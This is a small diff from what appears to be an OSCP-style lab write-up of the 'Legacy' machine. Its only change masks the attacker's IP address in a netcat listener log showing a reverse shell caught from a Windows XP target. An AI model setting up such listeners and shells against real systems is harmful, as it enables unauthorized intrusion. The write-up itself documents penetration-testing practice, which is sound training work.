@@ -116,7 +116,7 @@ Catch on the listener:
 ```
 kali@kali:~/Desktop/OSCP/Legacy$ nc -nlvp 4444
 listening on [any] 4444 ...
-connect to [10.10.14.23] from (UNKNOWN) [10.10.10.4] 1032
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.4] 1032
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
